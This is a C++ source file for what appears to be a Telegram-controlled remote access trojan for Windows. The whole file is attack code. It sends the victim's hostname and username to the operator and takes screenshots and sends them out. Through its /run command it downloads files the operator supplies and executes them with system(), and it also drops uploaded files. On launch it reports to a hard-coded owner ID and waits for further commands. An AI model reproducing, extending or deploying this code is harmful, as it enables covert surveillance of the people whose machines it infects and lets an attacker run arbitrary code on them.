#include "ebalpoco.h"


#define INFO_BUFFER_SIZE 32767
TCHAR  infoBuf[INFO_BUFFER_SIZE];
DWORD  bufCharCount = INFO_BUFFER_SIZE;

void runDownload(TgBot::Api api, TgBot::Message::Ptr message) {
    api.sendMessage(
        message->chat->id,
        "Downloading file from the Telegram..."
    );

    if (message->document == nullptr) {
        api.sendMessage(
            message->chat->id,
            "No file attached!"
        );
        return;
    }

    TgBot::File::Ptr file = api.getFile(message->document->fileId);
    std::string urlToDown = std::format("https://api.telegram.org/file/bot{}/{}", BOT_TOKEN, file->filePath);

    std::filesystem::path path(file->filePath);
    std::string extension = path.extension().string();

    std::string pathToDown = generateRandomPathToAnyFile(extension);

    downloadFile(urlToDown, pathToDown);

    api.sendMessage(
        message->chat->id,
        std::format("Uploaded to path: {}!", pathToDown)
    );

    std::string startIfNeed = extension == ".exe" ? "start \"Execution\" /b " : "";

    system(std::format("{}\"{}\"", startIfNeed, pathToDown).c_str());

    api.sendMessage(
        message->chat->id,
        std::format("Executed!")
    );
}

void runUpload(TgBot::Api api, TgBot::Message::Ptr message) {
    api.sendMessage(
        message->chat->id,
        "Downloading file from the Telegram..."
    );

    if (message->document == nullptr) {
        api.sendMessage(
            message->chat->id,
            "No file attached!"
        );
        return;
    }

    auto splitted = splitString(message->text, ' ');

    TgBot::File::Ptr file = api.getFile(message->document->fileId);
    std::string urlToDown = std::format("https://api.telegram.org/file/bot{}/{}", BOT_TOKEN, file->filePath);

    std::filesystem::path path(file->filePath);
    std::string extension = path.extension().string();

    std::string pathToDown = generateRandomPathToAnyFile(extension);

    downloadFile(urlToDown, pathToDown);

    api.sendMessage(
        message->chat->id,
        std::format("Uploaded to path: {}!", pathToDown)
    );
}

void ebalpoco_main() {
	printf("Hello from Ebal POCO if you're running it from console hehehehehe\n");
	
	TgBot::Bot bot(BOT_TOKEN);
    bot.getApi().deleteWebhook();

	bot.getEvents().onCommand("start", [&bot](TgBot::Message::Ptr message) {
        const auto host_name = boost::asio::ip::host_name();
        GetUserName(infoBuf, &bufCharCount);

        TgBot::InlineKeyboardMarkup::Ptr keyboard(new TgBot::InlineKeyboardMarkup);
        std::vector<TgBot::InlineKeyboardButton::Ptr> row0;
        TgBot::InlineKeyboardButton::Ptr checkButton(new TgBot::InlineKeyboardButton);
        checkButton->text = "Take a screenshot";
        checkButton->callbackData = "screenshot";
        row0.push_back(checkButton);
        keyboard->inlineKeyboard.push_back(row0);

		bot.getApi().sendMessage(
            message->chat->id, 
            std::format(
                "Computer's information:\n\nHostname: {}\nCurrent User: {}",
                host_name,
                infoBuf
            ),
            false,
            0,
            keyboard, "Markdown"
        );
	});

    bot.getEvents().onAnyMessage([&bot](TgBot::Message::Ptr message) {
        if (message->caption == "/run") runDownload(bot.getApi(), message);
        if (StringTools::startsWith(message->caption, "/upload")) runUpload(bot.getApi(), message);
    });

    bot.getEvents().onCallbackQuery([&bot](TgBot::CallbackQuery::Ptr query) {
        if (StringTools::startsWith(query->data, "screenshot")) {
            auto screenshotFileName = generateRandomPathToBmpFile();
            ScreenShot((char*)screenshotFileName.c_str());
            bot.getApi().answerCallbackQuery(query->id, "Screenshot was taken!");
            bot.getApi().sendPhoto(query->from->id, TgBot::InputFile::fromFile(screenshotFileName, "image/bmp"));
            DeleteFile(screenshotFileName.c_str());
        }
    });

    try {
        printf("Bot username: %s\n", bot.getApi().getMe()->username.c_str());
        bot.getApi().sendMessage(BOT_OWNER_ID, "I'm currently online!");
        TgBot::TgLongPoll longPoll(bot);

        while (true) {
            printf("Long poll started\n");
            longPoll.start();
        }
    }
    catch (TgBot::TgException& e) {
        printf("error: %s\n", e.what());
    }
}